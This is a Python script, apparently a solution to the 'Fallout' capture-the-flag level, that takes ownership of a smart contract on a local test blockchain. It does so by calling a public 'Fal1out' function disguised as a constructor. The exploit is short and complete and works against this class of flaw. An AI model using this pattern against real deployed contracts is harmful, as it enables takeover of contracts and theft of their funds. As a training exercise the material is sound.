# The fallout contract is a pretty simple example. The objective here is to get ownership
# of the contract since the owner can get all funds using the collectAllocations()
# functions. The contract does not use the OpenZeppelin implementation of ownership 
# and that makes things easier. There is a function called "fal1out" that is "duisguised"
# as a constructor by a well placed comment but it is actually a public function without
# restrictions. Whoever calls it, becomes ownwer

# Using web3.py library to make it easier building and signing transactions
from web3 import Web3
from web3.middleware import construct_sign_and_send_raw_middleware

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions. This private key is from the local network
# it is public and not safe to use in a real blockchain
account = Account.from_key("") #TODO: Include operator PK
print(account.address)

# Setting up the provider. For this tests I used a local deployed blockchain
w3Provider = Web3(Web3.HTTPProvider("http://127.0.0.1:8545/"))
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(account))
w3Provider.eth.default_account = account.address

# Getting ABI data from contracts builds and creating the contract object for easier
# contract methods calls.
buildFile = open('../contracts/build/contracts/levels/Fallout.sol/Fallout.json', "r")
build = json.loads(buildFile.read())
contract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# We just have to call the fal1out method to become owner
transaction = contract.functions.Fal1out().transact()
print(w3Provider.eth.wait_for_transaction_receipt(transaction))